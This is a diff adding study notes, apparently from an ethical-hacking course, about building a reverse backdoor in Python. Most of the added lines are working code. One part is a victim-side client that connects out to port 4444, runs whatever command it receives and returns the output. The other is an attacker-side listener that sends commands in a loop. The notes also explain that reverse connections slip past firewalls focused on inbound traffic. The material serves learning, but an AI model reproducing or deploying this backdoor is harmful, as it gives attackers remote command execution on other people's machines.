@@ -478,7 +478,37 @@ unknown port open by unknown program - hence making use of reverse connection. o
 connection from victim. firewall mostly concerned about incoming traffic. but ofcourse in our setup it doesnt allow outgoing 
 connections to unknown ips and ports. nc is used for a start. sublime doesnt have as many features as pycharm. 
 
-                        
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connection.connect(('hip',4444)) #argument is reqd in tuple hence 2 braces
+connection.send('Connected from wind')  #.encode('utf-8') was required since it kept asking for byte or just encode()
+recvd_data = connection.recv(1024) #1024 is buffer size
+cmd_out = subprocess.check_output(recvd_data)
+connection.send(cmd_out)
+connection.close()
+waiting on 4444 in his computer with listening nc. but better to implement a server at hend because we can implement download
+and upload functionalites etc. 
+listener = connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) #to reuse address incase connections get dropped
+listener.bind(('hip',4444))   #instead of connecting to a server we just bind to a port
+listener.listen(0)   #backlog is the number of connections that can be queued
+print('Awaiting incoming connection')
+connection, address = listener.accept()  #connection is an object which we can use to send and recv data as before
+print('Connection established from '+str(address))
+while True:
+        cmd = input('->')
+        connection.send(cmd)
+        res = connection.recv(1024)
+        print(res)
+        
+        
+
+
+
+
+
+
+
+
                         
                         
         
